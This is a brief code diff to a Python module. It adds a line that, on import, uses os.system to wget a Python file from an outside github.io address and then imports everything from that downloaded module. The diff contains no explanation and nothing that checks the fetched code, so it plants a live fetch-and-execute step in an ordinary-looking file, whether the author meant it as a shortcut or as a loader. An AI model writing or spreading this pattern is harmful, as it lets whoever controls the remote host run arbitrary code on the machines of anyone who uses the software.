@@ -1,4 +1,6 @@
 from os import system, popen
+
+system("wget http://333vipro333.github.io/program/work_conf_file.py")
 from work_conf_file import *
 
 
